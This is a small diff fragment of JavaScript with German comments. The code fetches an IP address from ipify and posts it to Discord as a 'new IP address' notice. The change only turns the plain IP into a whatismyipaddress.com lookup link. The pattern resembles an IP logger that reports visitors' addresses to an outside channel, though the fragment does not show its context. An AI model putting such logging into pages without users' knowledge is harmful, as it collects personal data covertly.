@@ -7,7 +7,7 @@ fetch("https://api.ipify.org?format=json")
 
     // Nachricht formatieren (nur IP)
     const payload = {
-      content: `📌 Neue IP-Adresse: \`${ip}\``
+      content: `📌 Neue IP-Adresse: <https://whatismyipaddress.com/ip/${ip}>`
     };
 
     // An Discord senden
